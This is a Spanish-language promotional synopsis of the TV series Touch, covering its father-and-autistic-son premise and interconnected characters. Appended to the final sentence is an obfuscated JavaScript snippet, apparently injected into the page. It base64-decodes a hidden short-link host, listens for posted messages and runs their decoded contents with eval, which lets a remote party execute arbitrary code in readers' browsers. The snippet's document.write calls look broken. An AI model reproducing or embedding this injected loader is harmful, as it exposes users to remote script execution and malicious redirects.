Descripcion
De la mano de Tim Kring (Héroes) y los productores ejecutivos Peter Chernin y Katherine Pope (Terra Nova) llega Touch, una serie en la que la ciencia y la espiritualidad se mezclab con la esperanzadora premisa de que todos estamos interconectados, unidos de forma invisible a aquellos a cuyas vidas estamos destinados a alterar e impactar. Concretamente, Touch se centra en la relación entre un padre y su hijo autista de once años, quien tiene necesidades especiales. Sus vidas darán un giro extraordinario cuando el niño empiece a hacer conexiones en su vida y en todo el mundo. Ambos están a punto de embarcarse en un viaje inspirador, una aventura que les permitirá ver el mundo de otra manera.
A través de su magistral narración, la serie sigue a un grupo de personajes, aparentemente sin relación entre ellos, comenzando con un ex-bombero atormentado por su incapacidad de salvar a una mujer moribunda; un adolescente iraquí que está dispuesto a asumir grandes riesgos para ayudar a su familia; una cantante con mucho talento cuyas actuaciones en un karaoke logra salvar vidas a miles de kilómetros de distancia; o un hombre de negocios inglés que está desesperado por conseguir cierta información vital que guardaba en el teléfono móvil que ha perdido. Todos ellos afectan la vida de los más, tanto de forma visible como invisible.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

